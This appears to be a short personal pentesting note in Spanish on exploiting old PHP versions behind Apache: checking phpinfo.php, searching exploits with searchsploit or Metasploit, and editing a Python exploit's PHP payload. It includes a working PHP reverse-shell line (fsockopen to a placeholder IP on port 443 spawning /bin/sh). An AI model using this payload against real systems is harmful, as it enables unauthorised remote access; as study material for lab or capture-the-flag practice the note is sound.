# Explotación  

Tags: #Linux #Enumeracion #Escaneo #PHP

## Apache httpd - PHP

```bash 
1. Mirar el archivo 'phpinfo.php' en la web
2. Buscar exploits para las versiones de PHP menores a '5.3.1' con 'Searchsplot php cgi' o 'Metasploit'
	1. Si encontramos uno con python, podemos modificar 'pwn_code' entre '<?php ?>' para colocar un '$sock=fsockopen("IP",443);exec("/bin/sh -i <&4 >&4 2>&4");' y asi obtener una reverse shell
```